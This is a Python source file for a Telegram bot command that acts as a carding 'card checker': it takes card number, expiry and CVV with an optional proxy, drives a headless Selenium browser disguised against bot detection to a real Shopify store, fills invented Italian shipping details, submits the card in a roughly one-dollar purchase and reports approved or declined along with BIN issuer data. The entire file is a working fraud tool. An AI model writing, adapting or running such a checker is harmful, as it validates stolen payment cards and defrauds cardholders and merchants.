from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import random
import time
import logging
import re  # AGGIUNTO IMPORT MANCANTE
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class Shopify1CheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            if self.proxy_url:
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.wait = WebDriverWait(self.driver, 15)
            logger.info("✅ Driver Shopify $1 inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def close_popup(self):
        """Chiude popup"""
        try:
            self.driver.execute_script("""
                var popup = document.querySelector('#shopify-pc__banner');
                if (popup) popup.remove();
            """)
            return True
        except:
            return False

    def generate_italian_info(self):
        """Genera informazioni italiane"""
        return {
            'first_name': 'Mario',
            'last_name': 'Rossi',
            'email': f"test{random.randint(1000,9999)}@gmail.com",
            'phone': f"3{random.randint(10,99)}{random.randint(1000000,9999999)}",
            'address': 'Via Roma 123',
            'city': 'Milano',
            'postal_code': '20100',
            'name_on_card': 'TEST CARD'
        }
    
    def add_to_cart(self):
        """Aggiunge prodotto al carrello"""
        try:
            self.driver.get("https://earthesim.com/products/usa-esim?variant=42902995271773")
            time.sleep(3)
            
            self.close_popup()
            
            add_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            self.driver.execute_script("arguments[0].click();", add_button)
            time.sleep(2)
            
            return True
        except Exception as e:
            print(f"❌ Errore aggiunta carrello: {e}")
            return False
    
    def go_to_cart_and_checkout(self):
        """Va al carrello e checkout"""
        try:
            self.driver.get("https://earthesim.com/cart")
            time.sleep(3)
            
            checkout_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[name='checkout'], button#checkout")))
            self.driver.execute_script("arguments[0].click();", checkout_button)
            time.sleep(5)
            
            return True
        except Exception as e:
            print(f"❌ Errore checkout: {e}")
            return False
    
    def fill_shipping_info(self, info):
        """Compila informazioni spedizione"""
        try:
            time.sleep(3)
            
            # Email
            email_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#email")))
            email_field.clear()
            email_field.send_keys(info['email'])
            
            # Nome
            first_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField0")
            first_name_field.clear()
            first_name_field.send_keys(info['first_name'])
            
            # Cognome
            last_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField1")
            last_name_field.clear()
            last_name_field.send_keys(info['last_name'])
            
            # Indirizzo
            address_field = self.driver.find_element(By.CSS_SELECTOR, "input#billing-address1")
            address_field.clear()
            address_field.send_keys(info['address'])
            
            # Città
            city_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField4")
            city_field.clear()
            city_field.send_keys(info['city'])
            
            # CAP
            postal_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField3")
            postal_field.clear()
            postal_field.send_keys(info['postal_code'])
            
            # Telefono
            phone_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField5")
            phone_field.clear()
            phone_field.send_keys(info['phone'])
            
            time.sleep(2)
            return True
            
        except Exception as e:
            print(f"❌ Errore spedizione: {e}")
            return False
    
    def fill_payment_info(self, info, card_data):
        """Compila informazioni pagamento"""
        try:
            time.sleep(2)
            
            # CARD NUMBER
            card_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-number']")
            self.driver.switch_to.frame(card_iframe)
            card_field = self.driver.find_element(By.CSS_SELECTOR, "input#number")
            card_field.clear()
            card_field.send_keys(card_data['number'])
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # EXPIRY DATE
            expiry_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-expiry']")
            self.driver.switch_to.frame(expiry_iframe)
            expiry_field = self.driver.find_element(By.CSS_SELECTOR, "input#expiry")
            expiry_field.clear()
            expiry_value = f"{card_data['month']}/{card_data['year']}"
            expiry_field.send_keys(expiry_value)
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # CVV
            cvv_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-verification_value']")
            self.driver.switch_to.frame(cvv_iframe)
            cvv_field = self.driver.find_element(By.CSS_SELECTOR, "input#verification_value")
            cvv_field.clear()
            cvv_field.send_keys(card_data['cvv'])
            self.driver.switch_to.default_content()
            time.sleep(1)
            
            # NAME ON CARD
            name_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-name']")
            self.driver.switch_to.frame(name_iframe)
            name_field = self.driver.find_element(By.CSS_SELECTOR, "input#name")
            name_field.clear()
            name_field.send_keys(info['name_on_card'])
            self.driver.switch_to.default_content()
            time.sleep(2)
            
            return True
            
        except Exception as e:
            print(f"❌ Errore pagamento: {e}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False
    
    def complete_purchase(self):
        """Completa acquisto"""
        try:
            time.sleep(2)
            
            pay_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button#checkout-pay-button")))
            self.driver.execute_script("arguments[0].click();", pay_button)
            print("✅ Pay Now cliccato")
            
            # Aspetta il risultato
            time.sleep(8)
            return True
                
        except Exception as e:
            print(f"❌ Errore completamento: {e}")
            return False
    
    def analyze_result(self):
        """Analizza risultato"""
        print("🔍 ANALISI RISULTATO SHOPIFY...")
        
        try:
            current_url = self.driver.current_url
            page_text = self.driver.page_source.lower()
            
            print(f"📄 URL: {current_url}")
            
            # 1. PRIMA CONTROLLA URL DI SUCCESSO
            if 'thank_you' in current_url or 'thank-you' in current_url or 'order' in current_url:
                print("✅ SUCCESSO - URL di ringraziamento")
                return "APPROVED"
            
            # 2. CONTROLLA MESSAGGI DI SUCCESSO NEL TESTO
            success_keywords = ['thank you', 'order confirmed', 'order number', 'confirmation', 'success']
            for keyword in success_keywords:
                if keyword in page_text:
                    print(f"✅ SUCCESSO - Trovato: {keyword}")
                    return "APPROVED"
            
            # 3. CONTROLLA ERRORI DI CARTA NEL TESTO
            decline_keywords = [
                'your card was declined', 'card was declined', 'declined', 
                'do not honor', 'insufficient funds', 'invalid card',
                'transaction not allowed', 'payment failed'
            ]
            for keyword in decline_keywords:
                if keyword in page_text:
                    print(f"❌ DECLINED - Trovato: {keyword}")
                    return "DECLINED"
            
            # 4. CONTROLLA ELEMENTI DI ERRORE VISIBILI
            try:
                error_elements = self.driver.find_elements(By.CSS_SELECTOR, ".field__message--error, .notice--error, .errors")
                for element in error_elements:
                    if element.is_displayed():
                        error_text = element.text.lower()
                        if any(word in error_text for word in ['declined', 'invalid', 'failed']):
                            print(f"❌ DECLINED - Errore visibile: {error_text}")
                            return "DECLINED"
            except:
                pass
            
            # 5. SE SIAMO ANCORA IN CHECKOUT, È FALLITO
            if 'checkout' in current_url:
                print("❌ DECLINED - Ancora in checkout")
                return "DECLINED"
            
            # 6. SE SIAMO SU UNA PAGINA DIVERSA DA CHECKOUT, È SUCCESSO
            if 'earthesim.com' in current_url and 'checkout' not in current_url:
                print("✅ APPROVED - Pagina diversa da checkout")
                return "APPROVED"
            
            # 7. DEFAULT: DECLINED
            print("❌ DECLINED - Nessun indicatore di successo trovato")
            return "DECLINED"
            
        except Exception as e:
            print(f"💥 Errore analisi: {e}")
            return f"ERROR - {str(e)}"
    
    def process_payment(self, card_data):
        """Processa pagamento"""
        try:
            print("🚀 INIZIO PROCESSO SHOPIFY $1")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            test_info = self.generate_italian_info()
            
            if not self.add_to_cart():
                return "ERROR_ADD_TO_CART"
            
            if not self.go_to_cart_and_checkout():
                return "ERROR_CHECKOUT"
            
            if not self.fill_shipping_info(test_info):
                return "ERROR_SHIPPING_INFO"
            
            if not self.fill_payment_info(test_info, card_data):
                return "ERROR_PAYMENT_INFO"
            
            if not self.complete_purchase():
                return "ERROR_COMPLETE_PURCHASE"
            
            result = self.analyze_result()
            return result
            
        except Exception as e:
            print(f"💥 Errore: {e}")
            return f"ERROR - {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_shopify1_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    processor = Shopify1CheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': expiry[:2],
        'year': "20" + expiry[2:],
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def s1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with Shopify $1"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 's1')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /s1 number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking Shopify $1...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        result = process_shopify1_payment(
            parsed_card['number'],
            parsed_card['month'] + parsed_card['year'][-2:],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        if "APPROVED" in result:
            status_emoji = "✅"
            title = "Approved"
        elif "DECLINED" in result:
            status_emoji = "❌" 
            title = "Declined"
        else:
            status_emoji = "⚠️"
            title = "Error"
        
        response = f"""{title} {status_emoji}

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: SHOPIFY $1
Response: {result}"""

        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in s1_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
